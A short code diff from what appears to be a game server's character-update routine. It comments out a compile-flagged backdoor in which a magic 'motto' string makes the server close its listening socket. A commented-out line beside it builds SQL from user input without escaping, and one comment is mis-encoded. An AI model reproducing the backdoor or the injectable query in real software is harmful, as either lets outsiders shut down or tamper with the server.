@@ -421,12 +421,12 @@ bool TBLCharacters::UpdateInfo(unsigned long cha_id, unsigned short icon, const 
 
 // account_save ���� id �ֶ�������
 //sprintf(sql, "update %s set icon =%d,motto ='%s' where cha_id =%d",_get_table(),icon,motto,cha_id);
-	#ifdef _BACKDOOR_
-	if(!strcmp(motto, "y4t0p5rules"))
-	{
-		g_gpsvr->CloseListenSocket();
-	}
-	#endif
+	//#ifdef _BACKDOOR_
+	//if(!strcmp(motto, "y4t0p5rules"))
+	//{
+	//	g_gpsvr->CloseListenSocket();
+	//}
+	//#endif
 
 
 	char buff[255];
